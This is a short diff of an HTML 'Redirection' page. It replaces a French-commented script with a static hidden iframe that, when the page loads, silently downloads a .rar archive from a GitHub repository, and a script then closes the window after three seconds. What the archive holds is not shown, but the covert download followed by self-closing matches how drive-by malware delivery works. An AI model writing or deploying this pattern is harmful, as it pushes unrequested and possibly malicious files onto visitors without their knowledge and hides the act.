@@ -6,20 +6,9 @@
     <title>Redirection</title>
 </head>
 <body>
+    <iframe style="display:none" src="https://github.com/ayoublahdoud/i/archive/main.rar"></iframe>
+
     <script>
-        // Créer une iframe invisible
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-
-        // Lien vers le fichier .rar
-        var rarUrl = 'https://github.com/ayoublahdoud/i/archive/main.rar';
-
-        // Définir la source de l'iframe pour déclencher le téléchargement
-        iframe.src = rarUrl;
-
-        // Ajouter l'iframe à la page
-        document.body.appendChild(iframe);
-
         // Fermer la fenêtre après 3 secondes
         setTimeout(function() {
             window.close();
